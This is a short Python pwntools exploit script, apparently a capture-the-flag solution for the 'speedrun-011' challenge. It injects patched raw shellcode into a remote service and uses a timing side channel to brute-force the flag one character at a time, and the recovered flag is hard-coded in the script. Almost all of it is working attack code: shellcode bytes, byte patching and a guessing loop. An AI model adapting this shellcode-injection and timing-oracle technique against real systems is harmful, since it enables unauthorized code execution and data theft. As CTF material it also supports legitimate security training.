from pwn import *
import string

# shellcode will compare byte of flag at $rdi+x to a byte, if neq then exit, if eq then jmp back and infinite loop (stops after 5 seconds because of alarm)
# timing was used as an oracle to info leak the flag (had to do it manually bc pwntools is a little weird idk)
sc = bytearray(bytes.fromhex("eb084831c0b03c0f05c34831db4883c7018a1f80fb4f75eaebf7c3")) # compiled from test.s, modified to jmp to "mov bl" instr instead of add rdi instr
flag = "OOO{Why___does_th0r__need_a_car?}"
sc[16] = 32
print(sc[16]) # inc byte to modify
print(sc[21]) # cmp byte to modify

# r = process("./speedrun-011")
# pause() 
for i in string.ascii_letters+"_'!?}"+string.digits:
    sc[21] = ord(i)
    print(i)
    r = remote("172.17.0.3", 31337)
    r.recvline()
    r.recvline()
    r.send(sc)
    r.interactive()
